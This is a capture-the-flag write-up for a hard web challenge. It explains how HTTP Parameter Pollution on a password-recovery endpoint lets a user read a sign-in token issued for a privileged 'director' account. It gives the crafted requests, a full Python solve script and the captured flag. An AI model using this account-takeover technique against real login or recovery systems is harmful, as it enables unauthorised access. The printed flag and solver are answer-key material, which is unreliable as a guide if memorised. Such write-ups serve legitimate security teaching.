---
title: "Velvet Rehearsal"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: hard
points: 500
flag_format: "safctf{...}"
author: "Strawhats"
---

# Velvet Rehearsal

> **Category:** WEB · **Points:** 500 · **Difficulty:** hard

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: http://54.72.82.22:8310  (Werkzeug 3.1.9 / Python 3.11.16, Flask)

## App surface (mapped)

- `GET /` — landing page. A "Desk console" (client-side `fetch`) hints the app
  expects arbitrary method/path/header requests; the details panel documents the
  three API routes.
- `GET|POST|PATCH /api/members` → `{"members":["visitor@studio.test","director@studio.test"]}`
- `GET|POST|PATCH /api/recovery?member=<email>` — "requests a sign-in link".
  - `member` absent or == `visitor@studio.test` → `{"mailbox":[{"subject":"Your sign-in link","token":"<36 hex>"}]}`
  - `member` present and != visitor (e.g. `director@studio.test`, `x@y.z`) → `{"queued":true}`
- `GET|POST|PATCH /api/entry` — JSON body `{"token": "..."}` → "opens the lounge".
- `POST /submit` — second stage, gated the same way.
- `/api/*` has a JSON 404 handler (`{"message":"Not found"}`); unknown top-level
  paths use the HTML 404.

## Gating behaviour of `/api/entry`

- token is a `str` but not accepted → `403 {"message":"The request could not be completed.","ok":false}`
- token is a list/dict (unhashable) → `400 {"message":"Request unavailable."}`

The 400-vs-403 split shows the check is a set/dict membership test
(`token in VALID`): unhashable values raise `TypeError` (caught → 400), hashable
wrong values simply miss (403). A JSON **string** body (not object) → `500`,
confirming `request.get_json(...).get(...)`.

Every token handed out by a normal `/api/recovery` call is rejected by
`/api/entry` (403), so the mailbox token alone is not the credential — the token
that gets *registered* differs from the one that gets *displayed*.

## The bug — HTTP Parameter Pollution (HPP)

`/api/recovery` reads the `member` parameter twice with different semantics:

- the authorization / mailbox-selection check uses the **first** value
  (`request.values.get("member", "visitor@studio.test")`),
- the token that is generated and stored is derived from the **last** value
  (e.g. `request.values.getlist("member")[-1]`).

So sending the parameter twice returns the *visitor* mailbox (readable) while
registering a token belonging to the *privileged* member:

```
POST /api/recovery?member=visitor@studio.test&member=director@studio.test
  -> {"mailbox":[{"subject":"Your sign-in link","token":"<T>"}]}
POST /api/entry   {"token":"<T>"}
  -> {"message":"safctf{1745c9cc8a433522796feb9cfb8275de}","ok":true}
```

Order matters: `member=director&member=visitor` hits the queue branch
(`{"queued":true}`), while `member=visitor&member=visitor` yields a token that is
correctly rejected (visitor, not privileged).

### What did NOT work (dead ends checked)

- Single `member` value, any case/encoding/type juggling (`director@studio.test`,
  arrays, dicts, JSON body, `%00`, unicode) → only ever `queued` or a
  non-privileged mailbox token.
- Token forecasting / derivation: tokens are uniform 36-hex (`secrets.token_hex(18)`-like),
  never repeat, and don't match md5/sha of the emails or plausible salts.
- Placement fuzzing: token as query/form/cookie/`X-*`/`Authorization` header on
  both `/api/entry` and `/submit` → 403.
- Race conditions (many concurrent queue+read pairs) → nothing.
- Hidden routes, backups, `.env`, `/static/*`, path traversal → none.

## Reproduce

```
python3 solve.py [http://54.72.82.22:8310]
# -> safctf{1745c9cc8a433522796feb9cfb8275de}
```

## Solve script

`web/velvet-rehearsal/solve.py`:

```python
#!/usr/bin/env python3
"""Solver: Velvet Rehearsal (WEB, 500 pts).

Vulnerability: HTTP Parameter Pollution in POST /api/recovery.

The endpoint reads ?member= to decide whose mailbox to render. The auth/mailbox
check takes the *first* occurrence of the parameter (== visitor) while the
sign-in token that actually gets stored (and later accepted by /api/entry) is
generated from the *last* occurrence (director). By sending

    POST /api/recovery?member=visitor@studio.test&member=director@studio.test

the response shows the visitor mailbox (so we can read the token), but the token
belongs to the director. Posting that token to /api/entry returns the flag.

Usage: python3 solve.py [base_url]
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8310").rstrip("/")
VISITOR = "visitor@studio.test"
DIRECTOR = "director@studio.test"


def solve(base=BASE):
    s = requests.Session()
    # HTTP parameter pollution: first value passes the visitor check (=> mailbox
    # is returned so we can read the token), last value is the privileged member
    # whose token is actually stored.
    r = s.post(
        base + "/api/recovery",
        params={"member": [VISITOR, DIRECTOR]},  # -> member=visitor..&member=director..
        timeout=20,
    )
    r.raise_for_status()
    token = r.json()["mailbox"][0]["token"]

    e = s.post(base + "/api/entry", json={"token": token}, timeout=20)
    e.raise_for_status()
    body = e.json()
    m = re.search(r"safctf\{[0-9a-fA-F]+\}", body.get("message", ""))
    if not m:
        raise SystemExit("no flag in response: %r" % body)
    return m.group(0)


if __name__ == "__main__":
    flag = solve()
    print(flag)
```

## Tools

**Used in this solve:**

- Python 3 (solver)

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{1745c9cc8a433522796feb9cfb8275de}
```
